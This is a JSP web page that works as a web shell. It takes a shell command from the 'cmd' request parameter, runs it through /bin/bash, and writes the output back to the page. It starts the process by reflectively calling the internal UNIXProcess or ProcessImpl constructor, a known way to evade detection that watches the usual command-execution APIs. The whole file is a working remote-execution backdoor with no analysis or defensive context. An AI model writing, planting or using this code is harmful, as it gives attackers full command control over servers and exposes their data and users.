<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.lang.reflect.Method" %>
<%!
    public static InputStream reflect(String cmd) throws Exception {
        InputStream inputStream = null;
        String[] strs = new String[]{"/bin/bash", "-c", cmd};
        Class<?> processClass = null;
        try {
            processClass = Class.forName("java.lang.UNIXProcess");
        } catch (ClassNotFoundException e) {
            processClass = Class.forName("java.lang.ProcessImpl");
        }
        Constructor<?> constructor = processClass.getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        // arguments
        byte[][] args = new byte[strs.length - 1][];
        int size = args.length;

        for (int i = 0; i < args.length; i++) {
            args[i] = strs[i + 1].getBytes();
            size += args[i].length;
        }

        byte[] argBlock = new byte[size];
        int i = 0;
        for (byte[] arg : args) {
            System.arraycopy(arg, 0, argBlock, i, arg.length);
            i += arg.length + 1;
        }
        int[] envc = new int[1];
        int[] std_fds = new int[]{-1, -1, -1};


        Object object = constructor.newInstance(
                toCString(strs[0]), argBlock, args.length,
                null, envc[0], null, std_fds, false
        );
        // 获取命令执行的InputStream
        Method inMethod = object.getClass().getDeclaredMethod("getInputStream");
        inMethod.setAccessible(true);
        inputStream = (InputStream) inMethod.invoke(object);

        return inputStream;
    }

    public static byte[] toCString(String s) {
        if (s == null)
            return null;
        byte[] bytes = s.getBytes();
        byte[] result = new byte[bytes.length + 1];
        System.arraycopy(bytes, 0,
                result, 0,
                bytes.length);
        result[result.length - 1] = (byte) 0;
        return result;
    }

    public static String scanner(InputStream inputStream) {
        return new Scanner(inputStream).useDelimiter("\\A").next();
    }
%>

<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        out.println(scanner(reflect(cmd)));
    }
%>